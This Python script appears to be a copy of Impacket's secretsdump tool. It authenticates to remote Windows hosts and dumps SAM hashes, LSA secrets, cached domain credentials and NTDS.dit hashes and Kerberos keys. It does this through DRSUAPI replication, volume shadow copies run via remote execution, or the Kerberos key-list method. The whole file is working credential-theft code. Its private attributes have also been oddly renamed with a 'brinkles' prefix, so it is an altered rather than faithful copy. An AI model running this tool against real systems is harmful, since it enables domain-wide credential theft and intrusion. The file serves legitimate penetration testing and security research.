#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs various techniques to dump hashes from the
#   remote machine without executing any agent there.
#   For SAM and LSA Secrets (including cached creds)
#   we try to read as much as we can from the registry
#   and then we save the hives in the target system
#   (%SYSTEMROOT%\\Temp dir) and read the rest of the
#   data from there.
#   For NTDS.dit we either:
#       a. Get the domain users list and get its hashes
#          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
#          call, replicating just the attributes we need.
#       b. Extract NTDS.dit via vssadmin executed  with the
#          smbexec approach.
#          It's copied on the temp dir and parsed remotely.
#
#   The script initiates the services required for its working
#   if they are not available (e.g. Remote Registry, even if it is
#   disabled). After the work is done, things are restored to the
#   original state.
#
# Author:
#   Alberto Solino (@agsolino)
#
# References:
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#

from __future__ import division
from __future__ import print_function
import argparse
import codecs
import logging
import os
import sys

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.ldap.ldap import LDAPConnection, LDAPSessionError

from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
    KeyListSecrets
from impacket.krb5.keytab import Keytab
try:
    input = raw_input
except NameError:
    pass

class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.brinkles__useVSSMethod = options.use_vss
        self.brinkles__useKeyListMethod = options.use_keylist
        self.brinkles__remoteName = remoteName
        self.brinkles__remoteHost = options.target_ip
        self.brinkles__username = username
        self.brinkles__password = password
        self.brinkles__domain = domain
        self.brinkles__lmhash = ''
        self.brinkles__nthash = ''
        self.brinkles__aesKey = options.aesKey
        self.brinkles__aesKeyRodc = options.rodcKey
        self.brinkles__smbConnection = None
        self.brinkles__ldapConnection = None
        self.brinkles__remoteOps = None
        self.brinkles__SAMHashes = None
        self.brinkles__NTDSHashes = None
        self.brinkles__LSASecrets = None
        self.brinkles__KeyListSecrets = None
        self.brinkles__rodc = options.rodcNo
        self.brinkles__systemHive = options.system
        self.brinkles__bootkey = options.bootkey
        self.brinkles__securityHive = options.security
        self.brinkles__samHive = options.sam
        self.brinkles__ntdsFile = options.ntds
        self.brinkles__history = options.history
        self.brinkles__noLMHash = True
        self.brinkles__isRemote = True
        self.brinkles__outputFileName = options.outputfile
        self.brinkles__doKerberos = options.k
        self.brinkles__justDC = options.just_dc
        self.brinkles__justDCNTLM = options.just_dc_ntlm
        self.brinkles__justUser = options.just_dc_user
        self.brinkles__ldapFilter = options.ldapfilter
        self.brinkles__pwdLastSet = options.pwd_last_set
        self.brinkles__printUserStatus= options.user_status
        self.brinkles__resumeFileName = options.resumefile
        self.brinkles__canProcessSAMLSA = True
        self.brinkles__kdcHost = options.dc_ip
        self.brinkles__options = options

        if options.hashes is not None:
            self.brinkles__lmhash, self.brinkles__nthash = options.hashes.split(':')

    def connect(self):
        self.brinkles__smbConnection = SMBConnection(self.brinkles__remoteName, self.brinkles__remoteHost)
        if self.brinkles__doKerberos:
            self.brinkles__smbConnection.kerberosLogin(self.brinkles__username, self.brinkles__password, self.brinkles__domain, self.brinkles__lmhash,
                                               self.brinkles__nthash, self.brinkles__aesKey, self.brinkles__kdcHost)
        else:
            self.brinkles__smbConnection.login(self.brinkles__username, self.brinkles__password, self.brinkles__domain, self.brinkles__lmhash, self.brinkles__nthash)

    def ldapConnect(self):
        if self.brinkles__doKerberos:
            self.__target = self.brinkles__remoteHost
        else:
            if self.brinkles__kdcHost is not None:
                self.__target = self.brinkles__kdcHost
            else:
                self.__target = self.brinkles__domain

        # Create the baseDN
        if self.brinkles__domain:
            domainParts = self.brinkles__domain.split('.')
        else:
            domain = self.__target.split('.', 1)[-1]
            domainParts = domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        try:
            self.brinkles__ldapConnection = LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.brinkles__kdcHost)
            if self.brinkles__doKerberos is not True:
                self.brinkles__ldapConnection.login(self.brinkles__username, self.brinkles__password, self.brinkles__domain, self.brinkles__lmhash, self.brinkles__nthash)
            else:
                self.brinkles__ldapConnection.kerberosLogin(self.brinkles__username, self.brinkles__password, self.brinkles__domain, self.brinkles__lmhash, self.brinkles__nthash,
                                                    self.brinkles__aesKey, kdcHost=self.brinkles__kdcHost)
        except LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                self.brinkles__ldapConnection = LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.brinkles__kdcHost)
                if self.brinkles__doKerberos is not True:
                    self.brinkles__ldapConnection.login(self.brinkles__username, self.brinkles__password, self.brinkles__domain, self.brinkles__lmhash, self.brinkles__nthash)
                else:
                    self.brinkles__ldapConnection.kerberosLogin(self.brinkles__username, self.brinkles__password, self.brinkles__domain, self.brinkles__lmhash, self.brinkles__nthash,
                                                        self.brinkles__aesKey, kdcHost=self.brinkles__kdcHost)
            else:
                raise

    def dump(self):
        try:
            if self.brinkles__remoteName.upper() == 'LOCAL' and self.brinkles__username == '':
                self.brinkles__isRemote = False
                self.brinkles__useVSSMethod = True
                if self.brinkles__systemHive:
                    localOperations = LocalOperations(self.brinkles__systemHive)
                    bootKey = localOperations.getBootKey()
                    if self.brinkles__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                        self.brinkles__noLMHash = localOperations.checkNoLMHashPolicy()
                else:
                    import binascii
                    bootKey = binascii.unhexlify(self.brinkles__bootkey)

            else:
                self.brinkles__isRemote = True
                bootKey = None
                if self.brinkles__ldapFilter is not None:
                    logging.info('Querying %s for information about domain users via LDAP' % self.brinkles__domain)
                    try:
                        self.ldapConnect()
                    except Exception as e:
                        logging.error('LDAP connection failed: %s' % str(e))
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.brinkles__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                            pass
                        else:
                            raise

                    self.brinkles__remoteOps  = RemoteOperations(self.brinkles__smbConnection, self.brinkles__doKerberos, self.brinkles__kdcHost, self.brinkles__ldapConnection)
                    self.brinkles__remoteOps.setExecMethod(self.brinkles__options.exec_method)
                    if self.brinkles__justDC is False and self.brinkles__justDCNTLM is False and self.brinkles__useKeyListMethod is False or self.brinkles__useVSSMethod is True:
                        self.brinkles__remoteOps.enableRegistry()
                        bootKey = self.brinkles__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.brinkles__noLMHash = self.brinkles__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.brinkles__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                        and self.brinkles__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        logging.error('RemoteOperations failed: %s' % str(e))

            # If the KerberosKeyList method is enable we dump the secrets only via TGS-REQ
            if self.brinkles__useKeyListMethod is True:
                try:
                    self.brinkles__KeyListSecrets = KeyListSecrets(self.brinkles__domain, self.brinkles__remoteName, self.brinkles__rodc, self.brinkles__aesKeyRodc, self.brinkles__remoteOps)
                    self.brinkles__KeyListSecrets.dump()
                except Exception as e:
                    logging.error('Something went wrong with the Kerberos Key List approach.: %s' % str(e))
            else:
                # If RemoteOperations succeeded, then we can extract SAM and LSA
                if self.brinkles__justDC is False and self.brinkles__justDCNTLM is False and self.brinkles__canProcessSAMLSA:
                    try:
                        if self.brinkles__isRemote is True:
                            SAMFileName = self.brinkles__remoteOps.saveSAM()
                        else:
                            SAMFileName = self.brinkles__samHive

                        self.brinkles__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.brinkles__isRemote)
                        self.brinkles__SAMHashes.dump()
                        if self.brinkles__outputFileName is not None:
                            self.brinkles__SAMHashes.export(self.brinkles__outputFileName)
                    except Exception as e:
                        logging.error('SAM hashes extraction failed: %s' % str(e))

                    try:
                        if self.brinkles__isRemote is True:
                            SECURITYFileName = self.brinkles__remoteOps.saveSECURITY()
                        else:
                            SECURITYFileName = self.brinkles__securityHive

                        self.brinkles__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.brinkles__remoteOps,
                                                       isRemote=self.brinkles__isRemote, history=self.brinkles__history)
                        self.brinkles__LSASecrets.dumpCachedHashes()
                        if self.brinkles__outputFileName is not None:
                            self.brinkles__LSASecrets.exportCached(self.brinkles__outputFileName)
                        self.brinkles__LSASecrets.dumpSecrets()
                        if self.brinkles__outputFileName is not None:
                            self.brinkles__LSASecrets.exportSecrets(self.brinkles__outputFileName)
                    except Exception as e:
                        if logging.getLogger().level == logging.DEBUG:
                            import traceback
                            traceback.print_exc()
                        logging.error('LSA hashes extraction failed: %s' % str(e))

                # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
                if self.brinkles__isRemote is True:
                    if self.brinkles__useVSSMethod and self.brinkles__remoteOps is not None and self.brinkles__remoteOps.getRRP() is not None:
                        NTDSFileName = self.brinkles__remoteOps.saveNTDS()
                    else:
                        NTDSFileName = None
                else:
                    NTDSFileName = self.brinkles__ntdsFile

                self.brinkles__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.brinkles__isRemote, history=self.brinkles__history,
                                               noLMHash=self.brinkles__noLMHash, remoteOps=self.brinkles__remoteOps,
                                               useVSSMethod=self.brinkles__useVSSMethod, justNTLM=self.brinkles__justDCNTLM,
                                               pwdLastSet=self.brinkles__pwdLastSet, resumeSession=self.brinkles__resumeFileName,
                                               outputFileName=self.brinkles__outputFileName, justUser=self.brinkles__justUser,
                                               ldapFilter=self.brinkles__ldapFilter, printUserStatus=self.brinkles__printUserStatus)
                try:
                    self.brinkles__NTDSHashes.dump()
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                        # We don't store the resume file if this error happened, since this error is related to lack
                        # of enough privileges to access DRSUAPI.
                        resumeFile = self.brinkles__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
                    logging.error(e)
                    if (self.brinkles__justUser or self.brinkles__ldapFilter) and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
                        logging.info("You just got that error because there might be some duplicates of the same name. "
                                     "Try specifying the domain name for the user as well. It is important to specify it "
                                     "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                    elif self.brinkles__useVSSMethod is False:
                        logging.info('Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter')
                self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if self.brinkles__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    while True:
                        answer =  input("Delete resume session file? [y/N] ")
                        if answer.upper() == '':
                            answer = 'N'
                            break
                        elif answer.upper() == 'Y':
                            answer = 'Y'
                            break
                        elif answer.upper() == 'N':
                            answer = 'N'
                            break
                    if answer == 'Y':
                        resumeFile = self.brinkles__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.brinkles__remoteOps:
            self.brinkles__remoteOps.finish()
        if self.brinkles__SAMHashes:
            self.brinkles__SAMHashes.finish()
        if self.brinkles__LSASecrets:
            self.brinkles__LSASecrets.finish()
        if self.brinkles__NTDSHashes:
            self.brinkles__NTDSHashes.finish()
        if self.brinkles__KeyListSecrets:
            self.brinkles__KeyListSecrets.finish()


# Process command-line arguments.
if __name__ == '__main__':
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                      "the remote machine without executing any agent there.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
    parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
    parser.add_argument('-security', action='store', help='SECURITY hive to parse')
    parser.add_argument('-sam', action='store', help='SAM hive to parse')
    parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
    parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                         'state')
    parser.add_argument('-outputfile', action='store',
                        help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
    parser.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method instead of default DRSUAPI')
    parser.add_argument('-rodcNo', action='store', type=int, help='Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)')
    parser.add_argument('-rodcKey', action='store', help='AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)')
    parser.add_argument('-use-keylist', action='store_true', default=False,
                        help='Use the Kerb-Key-List method instead of default DRSUAPI')
    parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                        'method to use at target (only when using -use-vss). Default: smbexec')

    group = parser.add_argument_group('display options')
    group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                            'Implies also -just-dc switch')
    group.add_argument('-ldapfilter', action='store', metavar='LDAPFILTER',
                       help='Extract only NTDS.DIT data for specific users based on an LDAP filter. '
                            'Only available for DRSUAPI approach. Implies also -just-dc switch')
    group.add_argument('-just-dc', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                       help='Extract only NTDS.DIT data (NTLM hashes only)')
    group.add_argument('-pwd-last-set', action='store_true', default=False,
                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    group.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
    group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

    if options.just_dc_user is not None or options.ldapfilter is not None:
        if options.use_vss is True:
            logging.error('-just-dc-user switch is not supported in VSS mode')
            sys.exit(1)
        elif options.resumefile is not None:
            logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
            sys.exit(1)
        elif remoteName.upper() == 'LOCAL' and username == '':
            logging.error('-just-dc-user not compatible in LOCAL mode')
            sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
        sys.exit(1)

    if options.use_keylist is True and (options.rodcNo is None or options.rodcKey is None):
        logging.error('Both the RODC ID number and the RODC key are required for the Kerb-Key-List approach')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
        logging.error('resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '':
        if options.system is None and options.bootkey is None:
            logging.error('Either the SYSTEM hive or bootkey is required for local parsing, check help')
            sys.exit(1)
    else:

        if options.target_ip is None:
            options.target_ip = remoteName

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
